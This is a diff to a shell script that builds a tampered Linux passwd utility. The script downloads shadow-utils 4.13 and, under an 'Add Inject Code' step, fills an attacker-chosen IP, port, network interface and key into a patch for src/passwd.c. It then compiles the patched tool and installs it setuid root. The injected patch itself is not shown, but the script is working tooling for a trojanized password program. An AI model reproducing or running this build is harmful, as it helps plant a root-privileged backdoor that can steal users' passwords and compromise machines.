@@ -26,26 +26,27 @@ if [[ $pass == n ]]; then
 fi
 
 ## Get dependancies and autogen ##
-sudo apt install -y git make autoconf autopoint libtool xsltproc bison byacc python3-pip
+sudo apt install -y make autoconf autopoint libtool xsltproc bison byacc python3-pip
 sudo pip3 install python-dotenv
 
-git clone https://github.com/shadow-maint/shadow
-cd shadow
+wget -nc https://github.com/shadow-maint/shadow/archive/refs/tags/4.13.tar.gz -O shadow.tar.gz
+tar -xf shadow.tar.gz
+cd shadow-4.13
 ./autogen.sh --without-selinux
 cd ../
 
 ## Add Inject Code ##
-cp passwdTemplate.patch passwd.patch
+cp passwdTemp.patch passwd.patch
 sed -i 's/%ip%/'"$ip"'/g' passwd.patch
 sed -i 's/%port%/'"$port"'/g' passwd.patch
 sed -i 's/%int%/'"$interface"'/g' passwd.patch 
 sed -i 's/%key%/'"$key"'/g' passwd.patch 
-git restore shadow/src/passwd.c
-patch shadow/src/passwd.c passwd.patch 
+tar -xf shadow.tar.gz shadow-4.13/src/passwd.c
+cd shadow-4.13
+patch src/passwd.c ../passwd.patch 
 
 ## Make ##
-cd shadow
 sudo make all 
 cd ../
-cp shadow/src/passwd ../
+cp shadow-4.13/src/passwd ../
 chmod 4755 passwd 
